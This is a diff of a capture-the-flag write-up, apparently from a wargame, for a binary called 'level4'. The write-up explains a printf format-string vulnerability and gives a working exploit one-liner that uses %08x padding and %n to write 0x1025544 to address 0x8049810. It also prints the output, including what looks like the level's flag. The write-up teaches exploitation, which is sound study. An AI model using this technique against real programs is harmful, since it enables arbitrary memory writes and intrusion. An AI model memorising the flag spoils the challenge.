@@ -68,8 +68,8 @@ This is the same vulnerability as `level3`. However, a few things changes :
 - Now the `printf` call is made in another function `p`. This would only add a couple of words into the stack : `p` sole argument, saved `eip`, saved `ebp`, `printf`'s sole argument...
 - The value from the address stored at `0x8049810` is now compared to a much bigger immediate value, `0x1025544`.
 
-Because of the buffer size, our format string is limited to 0x200 bytes. Remember that `%n` writes the number of characters processed so far by the format function.
-If we use the same `%n` specifier to write at arbitrary address, we would be quickly limited by our buffer being only 512 bytes. However, the **size of the format string is not the only way to influence how may characters the format function will write**.
+Because of the buffer size, our format string is limited to **0x200** bytes. Remember that `%n` writes the number of characters processed so far by the format function.
+If we use the same `%n` specifier to write at arbitrary address, we would be quickly limited by our buffer being only **512** bytes. However, the **size of the format string is not the only way to influence how may characters the format function will write**.
 
 From `man 3 printf` :
 
@@ -86,8 +86,21 @@ b7ff26b0.bffff794.b7fd0ff4.00000000.00000000.bffff758.0804848d.bffff550.00000200
 
 The address we need to set to `0x1025544` is `0x8049810`. In other words, we need `printf` to have processed **16930116** bytes when the function will encounter the `%n` specifier.
 
-The beginning of our buffer will be filled with the address `0x8049810`. Then, we advance `printf`'s internal pointer by 10 words, using `%08x` specifiers.
+The beginning of our buffer will be set to the address `0x8049810`. Then, we advance `printf`'s internal pointer by 10 words, using `%08x` specifiers. So far, printf's counter will be **84**. We need one last format string before getting to the global variable address, and we need to print enough characters :
 
 ```
-python -c 'print("\x10\x98\x04\x08" + "%08x"*10 + "%016930032x" + "%n")' | ./level4
+16930116 - 84 = 16930032
 ```
+
+## Putting It Together
+
+Our final command will be :
+
+```bash
+python -c 'print("\x10\x98\x04\x08" + "%08x"*10 + "%016930032x" + "%n")' | ./level4
+...
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b7ff37d0
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+Success !
